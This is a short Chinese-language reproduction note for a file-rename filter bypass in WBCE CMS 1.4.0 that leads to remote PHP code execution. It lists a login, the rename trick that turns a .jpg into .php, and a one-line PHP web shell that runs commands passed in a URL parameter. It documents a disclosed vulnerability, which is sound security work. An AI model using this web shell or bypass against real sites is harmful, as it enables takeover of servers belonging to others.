## 1. 漏洞介绍

在 WBCE CMS 1.4.0 和更早版本的 admin/media/rename.php 中存在文件重命名过滤器绕过。具有管理员权限的经过身份验证的用户可以利用这一点来重命名媒体文件名和扩展名。 （例如：将 PHP 代码放在 .jpg 文件中，然后将文件的基本名称更改为 filename.ph 并将文件的扩展名更改为 p。由于连接，名称将被视为 filename.php。）结果，远程攻击者可以执行任意 PHP 代码。

[Arbitrary file upload vulnerbility in WBCE CMS 1.4.0 · kbgsft/vuln-wbce Wiki · GitHub](https://github.com/kbgsft/vuln-wbce/wiki/Arbitrary-file-upload-vulnerbility-in-WBCE-CMS-1.4.0)

## 2. 漏洞复现

登录：admin/123456

先上传个图片shell，然后利用重命名功能改后缀

shell.jpg

```php
<?php 
echo "webshell works!";
system($_GET['cmd']);
?>
```

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312301123208.png)
